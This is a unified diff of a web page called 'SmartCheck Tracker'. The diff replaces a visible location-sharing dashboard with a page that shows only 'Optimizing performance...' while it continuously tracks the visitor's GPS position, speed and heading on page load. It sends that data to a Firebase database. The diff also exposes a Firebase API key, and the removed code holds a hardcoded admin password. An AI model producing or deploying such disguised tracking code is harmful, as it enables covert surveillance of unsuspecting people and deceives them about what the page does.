@@ -1,170 +1,77 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>SmartCheck Tracker</title>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
-  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: #111;
-      color: #eee;
-    }
-    header {
-      background: #222;
-      padding: 1rem;
-      text-align: center;
-      font-size: 1.5rem;
-      font-weight: bold;
-      color: #0f0;
-    }
-    .center {
-      text-align: center;
-      padding: 1rem;
-    }
-    .btn {
-      padding: 10px 20px;
-      font-size: 1.1rem;
-      background: #0f0;
-      color: #000;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      margin-top: 10px;
-    }
-    .btn:hover {
-      background: #0c0;
-    }
-    #map {
-      height: 400px;
-      margin: 10px auto;
-      max-width: 100%;
-    }
-    table {
-      width: 90%;
-      margin: auto;
-      border-collapse: collapse;
-      background: #1b1b1b;
-      color: #eee;
-    }
-    th, td {
-      border: 1px solid #333;
-      padding: 8px;
-      text-align: center;
-    }
-    th {
-      background: #333;
-    }
-    #login {
+      background-color: #f5f5f5;
+      color: #222;
+      font-family: Arial, sans-serif;
       display: flex;
-      flex-direction: column;
+      justify-content: center;
       align-items: center;
-      margin-top: 100px;
+      height: 100vh;
+      margin: 0;
+      flex-direction: column;
     }
-    #dashboard {
-      display: none;
+    .loading {
+      font-size: 18px;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <header>SmartCheck Tracker</header>  <div id="login">
-    <input type="password" id="adminPass" placeholder="Enter admin password" class="btn">
-    <button onclick="checkPassword()" class="btn">Login</button>
-  </div>  <div id="dashboard">
-    <div class="center">
-      <button onclick="sendLocation()" class="btn">📍 Send My Location</button>
-      <div id="status"></div>
-    </div>
-    <div id="map"></div>
-    <div class="center">
-      <h3>📊 Location History</h3>
-      <table id="history">
-        <thead>
-          <tr><th>Time</th><th>Latitude</th><th>Longitude</th><th>Speed (km/h)</th><th>Direction (°)</th></tr>
-        </thead>
-        <tbody></tbody>
-      </table>
-    </div>
-  </div>  <script>
+  <h2>SmartCheck</h2>
+  <div class="loading">Optimizing performance...</div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+  <script>
+    // ✅ Your Firebase Config
     const firebaseConfig = {
       apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
       authDomain: "gps-d0bab.firebaseapp.com",
-      projectId: "gps-d0bab",
       databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
+      projectId: "gps-d0bab",
+      storageBucket: "gps-d0bab.appspot.com",
+      messagingSenderId: "810816177909",
       appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
     };
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    let map, marker;
-    const userId = 'user_' + Math.random().toString(36).substring(2, 8);
+    // ✅ Generate random user ID (persistent)
+    const userID = localStorage.getItem("trackID") || `user_${Math.random().toString(36).substring(2, 10)}`;
+    localStorage.setItem("trackID", userID);
 
-    function checkPassword() {
-      const pass = document.getElementById('adminPass').value;
-      if (pass === 'ASCII') {
-        document.getElementById('login').style.display = 'none';
-        document.getElementById('dashboard').style.display = 'block';
-        initMap();
-        watchData();
-      } else {
-        alert('Wrong password');
-      }
+    function sendLocation(position) {
+      const { latitude, longitude, speed, heading } = position.coords;
+      const timestamp = new Date().toISOString();
+      const data = {
+        latitude,
+        longitude,
+        speed: speed || 0,
+        direction: heading || "N/A",
+        timestamp
+      };
+      db.ref('locations/' + userID).set(data);
     }
 
-    function sendLocation() {
+    function startTracking() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(pos => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-          const spd = (pos.coords.speed || 0) * 3.6; // m/s to km/h
-          const dir = pos.coords.heading || 0;
-          const ts = new Date().toISOString();
-          const data = { latitude: lat, longitude: lon, speed: spd.toFixed(2), direction: dir, timestamp: ts };
-          db.ref('locations/' + userId).push(data);
-          document.getElementById('status').innerText = '✅ Location sent successfully';
-        }, err => alert('GPS error: ' + err.message));
-      } else {
-        alert('Geolocation not supported');
+        navigator.geolocation.watchPosition(sendLocation, console.error, {
+          enableHighAccuracy: true,
+          maximumAge: 0,
+          timeout: 10000
+        });
       }
     }
 
-    function initMap() {
-      map = L.map('map').setView([0, 0], 2);
-      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-        attribution: '&copy; OpenStreetMap contributors'
-      }).addTo(map);
-    }
-
-    function watchData() {
-      db.ref('locations').on('value', snap => {
-        const data = snap.val();
-        const tbody = document.querySelector('#history tbody');
-        tbody.innerHTML = '';
-        if (!data) return;
-
-        let last;
-        for (let user in data) {
-          const entries = Object.values(data[user]);
-          entries.forEach(entry => {
-            const row = document.createElement('tr');
-            row.innerHTML = `<td>${entry.timestamp}</td><td>${entry.latitude}</td><td>${entry.longitude}</td><td>${entry.speed}</td><td>${entry.direction}</td>`;
-            tbody.appendChild(row);
-          });
-          last = entries[entries.length - 1];
-        }
-
-        if (last) {
-          const lat = parseFloat(last.latitude);
-          const lon = parseFloat(last.longitude);
-          if (marker) map.removeLayer(marker);
-          marker = L.marker([lat, lon]).addTo(map).bindPopup("Last seen here").openPopup();
-          map.setView([lat, lon], 13);
-        }
-      });
-    }
-  </script></body>
+    window.onload = startTracking;
+  </script>
+</body>
 </html>
